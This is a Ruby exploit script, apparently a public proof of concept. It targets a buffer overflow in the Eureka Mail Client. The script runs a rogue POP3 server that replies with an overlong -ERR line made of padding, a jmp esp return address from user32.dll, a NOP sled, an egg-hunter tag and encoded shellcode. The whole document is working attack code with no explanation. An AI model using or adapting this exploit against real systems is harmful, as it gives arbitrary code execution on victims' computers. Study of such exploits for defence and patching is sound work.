#
require 'socket'

ip_server = '192.168.0.13'
port = "110"

junk = "\x41" * 711
ret = "\x53\x93\x42\x7E" # Memory address 0x7E429353  - jmp esp from user32.dll
padding = "\x90" * 1000

shellcode =
"\x89\xe2\xd9\xcd\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43" \
"\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58" \
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" \
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" \
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x53\x56\x4d\x51" \
"\x58\x4a\x4b\x4f\x34\x4f\x30\x42\x56\x32\x43\x5a\x44\x42" \
"\x50\x58\x48\x4d\x46\x4e\x37\x4c\x54\x45\x30\x5a\x34\x34" \
"\x4a\x4f\x48\x38\x33\x47\x30\x30\x30\x30\x54\x34\x4c\x4b" \
"\x5a\x5a\x4e\x4f\x53\x45\x4b\x5a\x4e\x4f\x43\x45\x4a\x47" \
"\x4b\x4f\x4d\x37\x41\x41"

payload = junk + ret + padding + "w00tw00t" + shellcode

# Setup a server
server = TCPServer.new(ip_server, port)
puts "[+] Listening on tcp port 110 [POP3]... \n";
puts "[+] Configure Eureka Mail Client to connect to this host\n";
loop do
    client = server.accept
    loop do
        client.puts "-ERR " + payload
        puts " -> Sent #{payload.size} bytes"
    end
    client.close
end
puts "[+] Connection closed\n"